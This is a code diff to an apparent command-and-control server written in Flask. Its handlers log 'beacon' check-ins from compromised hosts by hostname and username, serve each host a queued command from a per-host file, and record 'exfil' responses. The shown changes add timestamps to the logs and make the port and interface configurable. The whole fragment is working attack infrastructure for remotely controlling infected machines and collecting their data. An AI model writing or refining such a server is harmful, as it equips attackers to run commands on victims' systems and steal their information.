@@ -1,5 +1,10 @@
+from datetime import datetime
 from flask import Flask
+
+
 app = Flask(__name__)
+port = 80
+iface = "0.0.0.0"
 
 
 @app.route('/')
@@ -18,13 +23,14 @@ def new_connection(hostname, username):
     cmd_file = open("cmds/" + hostname + ".txt", "r+")
 
     command = cmd_file.readline()
+    time = str(datetime.now())
 
     print('[+] Beacon from: ', hostname, ' as ', username)
-    log_file.writelines('[+] Beacon from: ' + hostname + ' as ' + username + '\n')
+    log_file.writelines(time + ' [+] Beacon from: ' + hostname + ' as ' + username + '\n')
 
     if command != '':
         print('[+] Command sent: ', command)
-        log_file.writelines('[+] Command sent: ' + command + '\n')
+        log_file.writelines(time + ' [+] Command sent: "' + command + '"\n')
         cmd_file.truncate(0)
     else:
         pass
@@ -40,9 +46,10 @@ def new_connection(hostname, username):
 def exfil_data(hostname, exfil):
     log_file = open("logs/" + hostname + ".txt", 'a')
     return_string = ''
+    time = str(datetime.now())
 
-    print('[i] Response from ', hostname, ": ", exfil)
-    log_file.writelines('[i] Response from ' + hostname + ": " + exfil + '\n')
+    print(' [i] Response from ', hostname, ": ", exfil)
+    log_file.writelines(time + ' [i] Response from ' + hostname + ": " + exfil + '\n')
 
     log_file.close()
 
@@ -50,8 +57,8 @@ def exfil_data(hostname, exfil):
 
 
 def start_server():
-    app.run(host = '0.0.0.0', debug=False, port=80)
+    app.run(host = iface, debug=False, port=port)
 
 
 if __name__ == '__main__':
-    app.run(host = '0.0.0.0', debug=True, port=80)
+    app.run(debug=True, port=port)
